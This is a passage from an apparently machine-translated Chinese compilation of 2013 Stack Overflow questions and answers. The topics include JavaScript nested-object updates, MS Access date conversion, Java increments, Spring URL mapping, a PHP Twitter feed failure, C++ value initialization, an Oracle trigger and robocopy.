  var stack = path.split('>');

  while(stack.length>1){
    object = object[stack.shift()];
  }

  object[stack.shift()] = newValue;

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:35:30.613

您想要更新您的方法签名以接受：您正在修改的对象、路径字符串以及您分配给最终路径属性的值。

```
function updateObject(data, path, value) {
        var pathArray = path.split(">");
        var pointer = data; // points to the current nested object
        for (var i = 0, len = pathArray.length; i < len; i++) {
            var path = pathArray[i];
            if (pointer.hasOwnProperty(path)) {
                if (i === len - 1) { // terminating condition
                    pointer[path] = value;
                } else {
                    pointer = pointer[path];
                }
            } else {
                // throw error or terminate. The path is incorrect
            }
        }
    } 
```

或者递归。或使用[while 循环](https://stackoverflow.com/a/6491621/360705)。但这是一般的想法。

小提琴：http: [//jsfiddle.net/Sq8j3/8/](http://jsfiddle.net/Sq8j3/8/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:43:16.513

调用对象有点令人困惑，`data`但这`data`也是函数的参数。因此，我已将参数的名称更改为`newVal`以清除此潜在问题。

这循环遍历路径并不断重置一个名为的变量，该变量`e`通常从指向`data`对象开始，并在我们循环时变得更加具体。最后，您应该几乎可以引用确切的属性——我们使用路径的最后一部分来设置新值。

```
function updateObject(newVal, path) {
    var pathArray = path.split(">"),
        i = 0,
        p = pathArray.length - 1, // one short of the full path
        e = data; // "import" object for changing (i.e., create local ref to it)
    for (i; i < p; i += 1) { // loop through path
        if (e.hasOwnProperty(pathArray[i])) { // check property exists
            e = e[pathArray[i]]; // update e reference point
        }
    }
    e[pathArray[i]] = newVal; // change the property at the location specified by path to the new value
}; 
```

您可能需要添加一些内容来捕获错误。我已经在`hasOwnProperty()`电话中进行了检查，但您可能需要比这更详细的信息。

**更新**

之前在代码中犯了一个愚蠢的错误，但它现在应该可以工作了。正如[这里](http://jsfiddle.net/guypursey/Sq8j3/12/)所证明的那样。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:31:21.137

重构[使用字符串键访问嵌套的 JavaScript 对象](https://stackoverflow.com/questions/6491463/accessing-nested-javascript-objects-with-string-key)

我明白了

```
var path = "store>book>0>price"
Object.byString = function(o, s) {
    var a = s.split('>');
    while (a.length) {
        var n = a.shift();
        if (n in o) {
            o = o[n];
        } else {
            return;
        }
    }
    return o;
}

function updateObject(data, path) {
  object2update= Object.byString(data, path);
} 
```

# jquery - 为什么 jQuery 不返回正确的 thead 元素的边框属性，是否有解决方法？

> ID：15092915
> 
> 赞同：2
> 
> 时间：2013-02-26T15:27:58.550
> 
> 标签：jquery, css, border, css-tables

如[这个 jsFiddle 所示](http://jsfiddle.net/bg100/GwjM2/2/)，jQuery 的 css 函数不会返回`<thead>`简单表格中元素的边框宽度/样式/颜色：

```
$("thead").css("border-top-width") // returns 0px 
```

如果我在 div 上尝试相同的操作，它可以正常工作：

```
$("div").css("border-top-width") // returns 1px (or whatever the border width is) 
```

为什么这不起作用？还有其他方法可以获取边界详细信息吗？如果这有所作为，我正在使用 Firefox。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-28T14:31:19.073

**为什么这不起作用？**

因为您`<thead>`显示的元素有一个伪元素。

让它'显示：块'和[边框会出现](http://jsfiddle.net/a3NZn/)

```
thead {display:block} 
```

**注意**：`Display:block`在头上可能有副作用。向您的医生询问有关“设置浮动”*浏览器*伪元素的建议。为了体验，设置`display:block`标签`<tbody>`使其内部内容（tr td）向左浮动，因此`<table width="100%">`不适用于内部`<td>`宽度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T11:18:27.963

试试这个，如果你仍然有问题：

```
parseInt($("thead").css("border-top")) 
```

# sql - DateValue 函数的标准表达式中的数据类型不匹配

> ID：15092919
> 
> 赞同：1
> 
> 时间：2013-02-26T15:28:09.900
> 
> 标签：sql, ms-access, datetime

我有一个查询，它的选择基于日期字段。问题是该日期字段有时为空，因此仅使用“而不是空”检查是否为空是行不通的。

这是我开发的：

```
SELECT DISTINCT WS_ALL_OBJ.[Owner ID], Users.CHARGE_UNIT, WS_ALL_OBJ.[Owner Name]
FROM WS_ALL_OBJ LEFT JOIN Users ON WS_ALL_OBJ.[Owner ID] = Users.CNAME
WHERE 
    (IIF(IsNull(WS_ALL_OBJ.[Last Modified]), DateValue('2050-12-01'), DateValue(Left(WS_ALL_OBJ.[Last Modified], 10))) < #2012-11-26#
   And 
    (Users.CHARGE_UNIT <> 'CQ'))
GROUP BY WS_ALL_OBJ.[Owner ID], Users.CHARGE_UNIT, WS_ALL_OBJ.[Owner Name]; 
```

运行此查询时，它会引发“标准表达式中的数据类型不匹配”错误消息。

我已经把它缩小到这行代码——`DateValue(Left(WS_ALL_OBJ.[Last Modified], 10))`因为如果我替换它`DateValue('2011-11-26')`——它工作得很好。

起初我以为是因为我的字段中有空值，`Last Modified`这就是我想出这个的原因 -`(IIF(IsNull(WS_ALL_OBJ.[Last Modified]), DateValue('2050-12-01'), DateValue(Left(WS_ALL_OBJ.[Last Modified], 10))) < #2012-11-26#`

那不应该解决空值问题吗？

另一种可能性是来自的字符串`Left()`格式不正确。我认为这是因为这个 - `DateValue('2011-11026')`- （格式错误）也会通过 Data Type Mismatch 异常。

然而，这就是所有数据的样子：

```
2008-01-18 13:10:54 CST 
```

它存储为“文本”字段，来自链接的 csv 文件。该`Left()`函数应采用前 10 个字符并传递给`DateValue()`

我很茫然，感谢任何帮助。

更新：我也试过`cdate(Left(WS_ALL_OBJ.[Last Modified], 10))`并得到同样的错误。我还修改为使用 `(IsNull(WS_ALL_OBJ.[Last Modified]) 或 WS_ALL_OBJ.[Last Modified] = '') 检查空字符串

我最终运行了一些查询，以确保不存在`WS_ALL_OBJ.[Last Modified] = ''`或`WS_ALL_OBJ.[Last Modified] = ' '`类似的存在。他们都返回零结果。

我也尝试了下面建议的查询结构，但无济于事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:16:23.797

考虑一个子查询来排除Null的`WS_ALL_OBJ`行。`[Last Modified]`这样可以避免尝试将 Null 转换为日期/时间值时发生的错误。

```
SELECT
    w.[Owner ID], u.CHARGE_UNIT, w.[Owner Name]
FROM
    (
        SELECT [Owner ID], [Owner Name], [Last Modified]
        FROM WS_ALL_OBJ
        WHERE [Last Modified] Is Not Null
    ) AS w
    LEFT JOIN Users AS u
    ON w.[Owner ID] = u.CNAME
WHERE 
        DateValue(Left(w.[Last Modified], 10)) < #2012-11-26#
    AND u.CHARGE_UNIT <> 'CQ'
GROUP BY w.[Owner ID], u.CHARGE_UNIT, w.[Owner Name]; 
```

笔记：

1.  我为表名使用了别名，因为这使我的大脑更容易消化 SQL。
2.  由于这是一个`GROUP BY`查询，`DISTINCT`因此不需要。
3.  `WHERE`子句条件 ( `u.CHARGE_UNIT <> 'CQ'`) 违背了`LEFT JOIN`. 我不知道打算发生什么，但在我看来，您不妨`INNER JOIN`改用它。
4.  如果`[Last Modified]`还可能包含零长度字符串，请在子查询中排除它们`WHERE`：

    WHERE Len([上次修改时间]) > 0

或者也许只是使用`IsDate()`：

```
WHERE IsDate([Last Modified]) = True 
```

或者 ...

```
WHERE IsDate(Left([Last Modified]), 10) = True 
```

顺便说一句，您可能已经注意到使用`[Last Modified]`日期/时间而不是文本数据类型会更容易。我假设您出于某种原因被文本困住了。但是，如果没有，请考虑更改它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T16:04:30.320

以下是我通常的处理方式。我冒昧地使用别名来缩短 SQL 并使其更具可读性。我强烈建议不要在字段名称中使用空格。如果您停止这种做法，您就不必担心使用括号。

我还猜测您将日期值存储为字符串。我通常会尽量避免这种情况。我认为在大多数情况下，最好在需要时将日期值转换为字符串，而不是相反。

确保将以下函数中的 vDate 参数保留为变体数据类型。如果您将其更改为字符串或日期，它将不允许您处理空值。您的 SQL 不会产生错误，而是会产生非常奇怪的结果。

你确定你的日期总是 10 个字符吗？日期值可以不用前导零来表示，这会使它们更短。

```
SELECT DISTINCT w.[Owner ID], u.CHARGE_UNIT, w.[Owner Name]
FROM WS_ALL_OBJ as w LEFT JOIN Users as u ON w.[Owner ID] = u.CNAME
WHERE 
    GetLastModDate(w.[Last Modified]) < #2012-11-26#
   And 
    u.CHARGE_UNIT <> 'CQ'
GROUP BY w.[Owner ID], u.CHARGE_UNIT, w.[Owner Name];

'Put this code in a VBA Module
Public Function GetLastModDate(vDate) as Date
    If Nz(vDate, "") = "" Then
        GetLastModDate = #01/12/2050#
    Else
        GetLastModDate = DateValue(Left(vDate), 10)
        End If
End Function 
```

# java - Java中的x++和++x有什么区别

> ID：15092920
> 
> 赞同：-2
> 
> 时间：2013-02-26T15:28:14.013
> 
> 标签：java, increment

> ## Java中的x++和++x有什么区别
> 
> 任何人都可以通过参考下面的代码告诉我上面的区别，

```
class Example{
    public static void main(String args[]){
        int x=10;
        int y;
        y=x++;  //Prints 11     10 
        System.out.println(x+"\t"+y)
    }
}

class Example{
    public static void main(String args[]){
        int x=10;
        int y;
        y=++x;  //Prints 11     11 
        System.out.println(x+"\t"+y)
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:30:01.310

`y=x++`将 x 分配给 y，然后递增 x。

`y=++x`递增 x，然后将其分配给 y。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:30:16.007

`++x`是**预增量**。即，x 的值首先递增，然后分配给 x。

`x++`是**后增量**。即，x 的值先赋值，然后递增。

```
y=x++; 
```

本质上是一样的

```
y =x;
x= x+1; 
```

`y=++x;`和

```
y= (x+1); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:41:24.937

不同之处在于，在第一种情况下 ( `x++`)，Java 首先解决了分配问题，然后递增`x`。在另一种情况下 ( `++x`)，Java 首先解析增量，然后解析赋值。在以下代码中，您将看到不同之处：

```
@Test
public void test1() {
    int x = 1;
    int y = 1;

    y = 2 + x++;
    assertEquals(2, x);
    assertEquals(3, y);
}

@Test
public void test2() {
    int x = 1;
    int y = 1;

    y = 2 + ++x;
    assertEquals(2, x);
    assertEquals(4, y);
} 
```

如您所见，`x`always 将递增，但不同之处在于解析表达式的顺序。

希望它会有用！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:30:52.643

前后增量。分别在赋值之前递增和在赋值之后递增。

# android - Android：创建一个动作栏

> ID：15092922
> 
> 赞同：0
> 
> 时间：2013-02-26T15:28:18.350
> 
> 标签：android, android-actionbar

我只是 android 的新手.. 我只是想问一下如何创建一个操作栏 ??.. 不使用来自我已下载的项目的导入 com.markupartist.android.widget.Actionbar.. 谢谢。 .我用的是2.2版本

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:33:10.807

如果您的应用程序运行 HC+（并且您使用全息主题），您将默认获得一个 ActionBar。但是，由于 ActionBar 是与 HC（API 级别 11）一起引入的[`ActionBarSherlock`](http://actionbarsherlock.com)，如果您想在 HC 之前的设备上使用它，您必须使用 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-19T13:27:41.967

如果你想在你的项目中使用 ActionBar，那么只需从这个链接下载它 [下载 Actionbar 库项目](https://github.com/johannilsson/android-actionbar)

*   现在将此项目导入到您的 Eclipse 中。
*   之后将其设置为项目中的库。

完成...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T15:34:29.887

来自[Android 开发者指南](http://developer.android.com/guide/topics/ui/actionbar.html)：

> 从 Android 3.0（API 级别 11）开始，操作栏包含在使用 Theme.Holo 主题（或其后代之一）的所有活动中，当 targetSdkVersion 或 minSdkVersion 属性设置为“11”时，这是默认主题"或更大。

因此，您只需要设置

```
<uses-sdk android:minSdkVersion="11" /> 
```

或者

```
<uses-sdk android:targetSdkVersion="11" /> 
```

在您的 AndroidManifest.xml 中。当然，您可以根据需要将其设置为高于 11，但 11 是自动包含 ActionBar 的最小值。

# javascript - draw2d.js : 连接事件

> ID：15092923
> 
> 赞同：4
> 
> 时间：2013-02-26T15:28:20.180
> 
> 标签：javascript, draw2d-js

如何知道 draw2d js libdrary ( [http://www.draw2d.org/draw2d/](http://www.draw2d.org/draw2d/) ) 中连接了哪些两个数字？我找不到相应的事件/回调方法..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-26T15:34:41.907

抱歉，发现：CommandStack 的 stackChanged 方法，带有一个参数事件，带有 command.label="Connecting Ports"，确保您捕捉到 postExecute 事件。

# url - web.xml 中的 Spring PageNotFound 和 URLMapping

> ID：15092924
> 
> 赞同：0
> 
> 时间：2013-02-26T15:28:22.710
> 
> 标签：url, spring-mvc, view, tomcat7, web.xml

我一直在阅读很多这样的问题，但我并没有摆脱麻烦，我开始认为问题在于tomcat在玩。首先，这是我的 web.xml、*-servlet.xml 和我的控制器。

web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xmlns="http://java.sun.com/xml/ns/javaee"
xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" version="3.0">

<display-name>Spring REST Server</display-name>
<description>Spring REST Server</description>
<context-param>
  <param-name>log4jConfigLocation</param-name>
  <param-value>classpath:env/log4j.properties</param-value>
</context-param>
<context-param>
<param-name>contextConfigLocation</param-name>
<param-value>
            classpath:config/applicationContext.xml
            classpath:config/kimboo-servlet.xml
</param-value>
</context-param>
<context-param>
  <param-name>webAppRootKey</param-name>
  <param-value>Kimboo</param-value>
</context-param>
<listener>
  <listener-class>org.springframework.web.util.Log4jConfigListener</listener-class>
</listener>
<listener>
  <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>

<!-- Spring MVC Dispatcher Servlet -->
<servlet>
  <servlet-name>kimboo</servlet-name>
  <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
  <init-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>
      classpath:config/applicationContext.xml
      classpath:config/kimboo-servlet.xml
    </param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
  <servlet-name>kimboo</servlet-name>
  <url-pattern>/home/</url-pattern>
</servlet-mapping>
</web-app> 
```

这是我的 kimboo-servlet.xml

```
<beans xmlns="http://www.springframework.org/schema/beans"
xmlns:context="http://www.springframework.org/schema/context"
xmlns:mvc="http://www.springframework.org/schema/mvc" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="
    http://www.springframework.org/schema/beans     
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context 
    http://www.springframework.org/schema/context/spring-context-3.0.xsd
    http://www.springframework.org/schema/mvc
    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd">

<context:component-scan base-package="ar.com.kimboo.server.ui.controller" />

<mvc:annotation-driven />

<bean
    class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    <property name="prefix" value="/WEB-INF/AppClient/pages/" />
    <property name="suffix" value=".html" />
</bean> 
```

这是我的控制器

```
@Controller
@RequestMapping(value = "/home")
public class HomeController {

@RequestMapping(value = "/")
public String home() {
    return "login";
}

@RequestMapping(value = "/main")
public String main() {
    return "main";
}

    @RequestMapping(value = "/about")
public String main() {
    return "about";
}
} 
```

这是一个非常简单的例子，我不知道为什么不起作用。我已经阅读了很多这样的问题，在这里和其他网站，我不知道我错过了什么。

顺便说一句，在控制器中，我尝试了所有的方法来匹配 url；将“/home/”或“home/”放在类级别，将“login”或“main”放在方法级别。

唯一有效的是当我点击 localhost:8080/myServer/home/ 时。我尝试*在 web.xml 的 url 模式中使用“/home/”而不是“/home/”。我也试过使用“/”和“/* ”，但都是一样的。

唯一可行的方法是在我使用的 web.xml 的 url 模式中

```
<url-pattern>/home/</url-pattern>
<url-pattern>/home/main/</url-pattern>
<url-pattern>/home/login/</url-pattern> 
```

然后我可以点击所有的网址。我不知道该怎么办，也许这是一个tomcat 7的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T04:15:04.473

您没有为控制器和注释处理程序配置映射。在 kimboo-servlet.xml 的 bean 配置下面添加它，并添加相应的 jars。它可能会起作用。

```
<bean class="org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter" />
<bean class="org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter" />

<bean id="simpleUrlMapping"  class="org.springframework.web.servlet.handler.SimpleUrlHandlerMapping">
    <property name="mappings">
         <value>
            /home/**=homeController 
        </value>
    </property>
</bean> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:06:18.617

我怀疑这不是 TomCat 问题，而是您如何注释控制器的问题。请按如下方式替换您的控制器注释

```
 @Controller
public class HomeController {

@RequestMapping(value = "/home")
public String home() {
    return "login";
}

@RequestMapping(value = "/home/main")
public String main() {
    return "main";
}

    @RequestMapping(value = "home/about")
public String main() {
    return "about";
}

} 
```

这只是一个猜测。对不起，如果我弄错了。我记得在 REST 服务中看到过这个问题。也许它是一样的。现在没有时间自己测试它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-12T18:29:49.340

看看这个问题：[Basic Spring MVC config: PageNotFound using InternalResourceViewResolver](https://stackoverflow.com/questions/3878957/basic-spring-mvc-config-pagenotfound-using-internalresourceviewresolver)。原因是您的映射太宽并干扰`JspServlet`映射。

# msbuild - 将属性值从 TFS 构建定义传递到 proj 文件

> ID：15092927
> 
> 赞同：6
> 
> 时间：2013-02-26T15:28:27.990
> 
> 标签：msbuild, tfsbuild

我在 TFS 2012 实例中设置了构建定义。在此构建定义中，我想传入一个自定义参数并在我的 .csproj 文件中访问所述参数。例如：

```
MSBuild Arguments: /p:MyFoo=1 
```

在我的 .csproj 文件中，我想这样做：

```
<ItemGroup Condition=" '$(MyFoo)' == '1' "> 
```

这是可能的，还是我做错了？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-02-26T16:56:05.687

这是不可能的，它很容易做到。编辑您的构建定义，在进程选项卡下展开“高级”部分，您将看到一个名为“MSbuild Arguments”的属性以问题中的格式添加参数。例如`/p:MyFoo=1`

例如

![将 msbuild 参数添加到 TFS 构建定义](../Images/f3c2b1b3159edfeaf5fd1fd4920f1ee6.png)

您还可以在对构建进行排队时输入参数

![在此处输入图像描述](../Images/c0f589a9e26f6626a244d9987401092f.png)

# php - twitter api 从本地主机工作，但不是从远程主机

> ID：15092929
> 
> 赞同：0
> 
> 时间：2013-02-26T15:28:30.650
> 
> 标签：php, twitter

`failed to open stream`在我的远程虚拟主机上运行以下代码时不断获取。

```
$feed = simplexml_load_string(file_get_contents('http://api.twitter.com/1/statuses/user_timeline.rss?screen_name=kratteteast&count=1'),  'SimpleXMLElement', LIBXML_NOCDATA); 
```

从`localhost`它每次都有效。

有任何想法吗？

**编辑**：它适用于以相同方式访问的其他 2 个提要（新闻（谷歌）和博客）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T16:08:04.733

Twitter 默认支持 localhost。在本地主机之外，在 twitter api 中，您必须将域设置为您使用小部件的域。

例如，我这样做了：

*.stewardxpress.com, *.ihnbc.com

您可以包含多个以逗号分隔的域。当您在这些域上使用小部件时，twitter 会识别它。除此之外，它只会识别本地主机。

我希望这可以帮助你。

# 编辑

我从头开始运行你的脚本。

```
$feed = simplexml_load_string(file_get_contents('http://api.twitter.com/1/statuses/user_timeline.rss?screen_name=kratteteast&count=1'),  'SimpleXMLElement', LIBXML_NOCDATA);
           print_r ( $feed ) ; 
```

它返回这个：

```
SimpleXMLElement Object ( [@attributes] => Array ( [version] => 2.0 ) [channel] => SimpleXMLElement Object ( [title] => Twitter / KrattetEast [link] => http://twitter.com/KrattetEast [description] => Twitter updates from Tornekrattet Ã˜st / KrattetEast. [language] => en-us [ttl] => 40 [item] => SimpleXMLElement Object ( [title] => KrattetEast: @Erlendnr Kanskje her: http://t.co/mZ05VHkIxz [description] => KrattetEast: @Erlendnr Kanskje her: http://t.co/mZ05VHkIxz [pubDate] => Wed, 27 Feb 2013 14:51:08 +0000 [guid] => http://twitter.com/KrattetEast/statuses/306778498259902464 [link] => http://twitter.com/KrattetEast/statuses/306778498259902464 ) ) ) 
```

检查您的 PHP 安装和配置。查看您的远程服务器是否以任何方式阻止了跨域访问，或者相同的 twitter 限制正在发挥作用。我从本地主机测试。

当我测试遥控器时，我失败了。这就是为什么：

```
file_get_contents(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 
```

您可以看到 http:// 包装器在服务器中被禁用。所以你有一个服务器问题。用服务器主机修复它。联系管理员。或者您的主要选择是 cURL。

# c++ - 继承类中的构造函数调用

> ID：15092931
> 
> 赞同：2
> 
> 时间：2013-02-26T15:28:32.880
> 
> 标签：c++, constructor, initialization, default, default-constructor

考虑以下代码：

```
class A {
public:
    int a;
};

class B : public A {
public:
    B() { std::cout << "B[" << a << "]" << std::endl; }
};

class C : public B {
public:
    C() { std::cout << "C[" << a << "]" << std::endl; }
};

int main(int argc, char *argv[]) {

    B();
    std::cout << std::endl;
    C();

} 
```

及其输出——用 g++ (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3 编译的程序：

```
B[0]

B[-2097962768]
C[-2097962768] 
```

我发现获得第二次调用的唯一方法`C()`——初始化其值是向构造函数添加显式调用，例如：

```
class B : public A {
public:
    B() : A() { std::cout << "B[" << a << "]" << std::endl; }
};

class C : public B {
public:
    C() : B() { std::cout << "C[" << a << "]" << std::endl; }
}; 
```

尽管我知道调用每个以前的类的默认构造函数都会初始化这些值，但是当没有指定任何内容时，我无法看到正在调用的内容。

默认构造函数不是默认调用的 - 因此它的句柄？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-26T15:48:02.777

使用您的原始代码

```
class A {
public:
    int a;
};

class B : public A {
public:
    B() { std::cout << "B[" << a << "]" << std::endl; }
}; 
```

的成员`A`未初始化，因为您尚未指定任何初始化。通常，在 C++ 中，您不需要为不需要的东西付费。因此，默认情况下，您不会为 POD 成员获取初始化（但是，您会为具有构造函数的成员获取它，因为那里指定了初始化）。

在您随后的“显式构造函数调用”代码中

```
class B : public A {
public:
    B() : A() { std::cout << "B[" << a << "]" << std::endl; }
}; 
```

您已指定基类子对象的**值初始化。**`A`这有效地减少了零初始化。

和这个区别是一样的

```
A* p = new A; 
```

相对

```
A* p = new A(); 
```

后一个值初始化对象。

* * *

标准…

> **C++11 §8.5/10**：
> “初始化器为空括号集的对象，即 ，`()`应进行值初始化。”

> **C++11 §8.5./7**：
> “对类型对象进行*值初始化*`T`意味着：
> - 如果`T`是具有用户提供的构造函数 (12.1) 的（可能是 cv 限定的）类类型（第 9 条），则默认调用构造函数（如果没有可访问`T`的默认构造函数，则初始化格式错误）； — 如果是（可能是 cv 限定的）非联合类类型，没有用户提供的构造函数，则该对象是零初始化的，如果 T 的隐式声明的默认构造函数是非平凡的，则调用该构造函数。 — 如果是数组类型，则每个元素都是值初始化的； — 否则，对象被零初始化。`T`
> `T`
> `T`
> 
> 值初始化的对象被认为是已构造的，因此受制于适用于“构造的”对象、“构造函数已完成的对象”等的本国际标准的规定，即使没有为对象的构造函数调用构造函数。初始化。”

可能值得注意的是，值初始化不是原始 C++98 的一部分。它是由 Andrew Koenig（以“Koenig 查找”闻名）在 C++03 中引入的，目的是处理一些纯默认初始化的意外影响的严重问题。这就是`()`初始化程序在 C++98 中给你买的东西。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-26T15:31:45.380

**编辑**我原来的答案是完全错误的，所以我对它进行了大量编辑。

如果要保证`A::a`在没有值初始化调用的情况下是零初始化的，例如

```
A a1; // 
```

或者

```
B() { .... } 
```

然后你可以给`A`一个构造函数并在那里进行初始化：

```
class A {
public:
  A() : a() {} // value initialization of a, means zero initialization here.
    int a;
}; 
```

否则，显式调用and`A()`的构造函数执行值初始化。`B``C`

```
// value initialization of A sub-object leads to zero initialization of A::a
 B() : A() {} 
```

`A`这也适用于实例的初始化：

```
A a1 = A(); 
```

# mediawiki - Semantic Mediawiki 不跟踪重定向

> ID：15092935
> 
> 赞同：0
> 
> 时间：2013-02-26T15:28:46.640
> 
> 标签：mediawiki, semantics, mediawiki-templates, semantic-mediawiki

我最近重命名了几个页面（并更新了所有重定向），从那时起，他们的重定向都没有出现在`{{#ask}}`基于页面名称的查询中。例如，我有一个页面从 Infliximab 重命名为 PF-06438179，它有 26 个重定向。之前，页面上的模板带有表单的查询

```
{{#ask: [[category:clinical studies]] [[compound number::{{PAGENAME}}]] ... }} 
```

列出了 53 个页面，但自从移动以来，它只列出了直接链接到该页面的 6 个（并忽略了链接到重定向的 47 个）。

*   我已多次对所有重定向执行虚拟编辑以尝试刷新索引
*   我在页面和模板上执行了虚拟编辑以尝试刷新`{{#ask}}`功能
*   我在一些链接到重定向的页面上执行了虚拟编辑，以尝试刷新语义标签
*   我已通过 SMW 管理面板完成了一个数据修复周期
*   我已经运行了我的系统管理员`refreshLinks.php`

这些都没有解决问题。如何让 SMW 重新发现这些重定向？谢谢！

*   语义媒体维基 1.8
*   媒体维基 1.20.2
*   PHP 5.3.19 (apache2handler)
*   MySQL 5.1.30

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-03T21:07:02.903

它认为你必须设置

```
 $smwgQEqualitySupport=SMW_EQ_NONE; 
```

请参阅[$smwgQEqualitySupport 上的帮助](http://semantic-mediawiki.org/wiki/Help%3a%24smwgQEqualitySupport)

# sql - 带有编译错误的 Oracle 触发器创建

> ID：15092940
> 
> 赞同：1
> 
> 时间：2013-02-26T15:29:23.410
> 
> 标签：sql, oracle, triggers

如果课程日期与会话所在的星期几不匹配，我编写了以下触发器以防止用户将课程分配给会话。

```
CREATE OR REPLACE TRIGGER trig_alternative_classDate
AFTER INSERT OR UPDATE ON ALTERNATIVE
FOR EACH ROW
DECLARE
    classdate CHAR;
    sessionday VARCHAR;
BEGIN
    SELECT to_char(to_date(class.class_date), 'Day') INTO classdate, sessions.day INTO sessionday
    FROM SESSIONS, CLASS, DUAL, LOCATION, ALTERNATIVE
    WHERE class.class_id = alternative.class_id
    AND alternative.location_id = location.location_id
    AND sessions.location_id = location.location_id;
    IF sessions.day != to_char(to_date(class.class_date), 'Day')
    THEN raise_application_error(-20999,'Invalid Class Date - Class Date does not match Session Day');
    END IF;
END;
/ 
```

但是，当我运行触发器时收到一条错误消息

```
Warning: Trigger created with compilation errors.

SQL> show error trigger trig_alternative_classDate
Errors for TRIGGER TRIG_ALTERNATIVE_CLASSDATE:

LINE/COL ERROR
-------- -----------------------------------------------------------------
5/2  PL/SQL: SQL Statement ignored
5/80 PL/SQL: ORA-00923: FROM keyword not found where expected 
```

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:37:00.673

删除第二个 INTO - 只需要一个 INTO：

```
INTO classdate, sessions.day INTO sessionday 
```

# java - 如何找到字符串中的所有第一个索引？

> ID：15092941
> 
> 赞同：4
> 
> 时间：2013-02-26T15:29:23.953
> 
> 标签：java

我正在使用这个来源：

```
String fulltext = "I would like to create a book reader  have create, create ";

String subtext = "create";
int i = fulltext.indexOf(subtext); 
```

但我只找到第一个索引，如何找到字符串中的所有第一个索引？（在本例中为三个索引）

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-26T15:31:16.753

找到第一个索引后，使用[`indexOf`](http://docs.oracle.com/javase/7/docs/api/java/lang/String.html#indexOf%28int,%20int%29)接收起始索引作为第二个参数的重载版本：

> `public int indexOf(int ch, int fromIndex)`返回此字符串中第一次出现指定字符的索引，从指定索引开始搜索。

继续这样做直到`indexOf`返回`-1`，表示没有更多匹配项可以找到。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-26T15:35:49.130

您可以将正则表达式与 Pattern 和 Matcher 一起使用。`Matcher.find()`试图找到下一场比赛，`Matcher.start()`并会给你比赛的开始索引。

```
Pattern p = Pattern.compile("create");
Matcher m = p.matcher("I would like to create a book reader  have create, create ");

while(m.find()) {
    System.out.println(m.start());
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-26T15:33:39.423

使用接受起始位置的 indexOf 版本。循环使用它，直到它不再找到为止。

```
String fulltext = "I would like to create a book reader  have create, create ";
String subtext = "create";
int ind = 0;
do {
    int ind = fulltext.indexOf(subtext, ind);
    System.out.println("Index at: " + ind);
    ind += subtext.length();
} while (ind != -1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T15:32:40.293

您想创建一个 while 循环并使用`indexof(String str, int fromIndex)`.

```
String fulltext = "I would like to create a book reader  have create, create ";
int i = 0;
String findString = "create";
int l = findString.length();
while(i>=0){

     i = fulltext.indexOf(findString,i+l);
     //store i to an array or other collection of your choice
 } 
```

# shell - 在 Windows 7 上，需要将 B\ 中不存在的文件从 A\ 复制到 B\

> ID：15092950
> 
> 赞同：0
> 
> 时间：2013-02-26T15:29:49.847
> 
> 标签：shell, directory, file-copying

我需要将某种类型的文件（* .vcproj）从文件夹树 A\ 复制到树 B 中的相应文件夹。A\ 下会有几级嵌套文件夹，但 B\ 中存在相同的文件夹结构A\ 中的某些文件夹*可能*不存在于 B\ 中，反之亦然。

我可以访问 cygwin、perl 和 powershell。只是不知道该怎么做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:39:48.293

[Robocopy](http://technet.microsoft.com/en-us/library/cc733145%28v=ws.10%29.aspx)应该做你需要的。`robocopy ./a ./b *.vcproj /s`会变成这样：

```
/a
  /dir
    test.vcproj
  another.vcproj

/b
  /otherDir 
```

进入这个：

```
/a
  /dir
    test.vcproj
  another.vcproj

/b
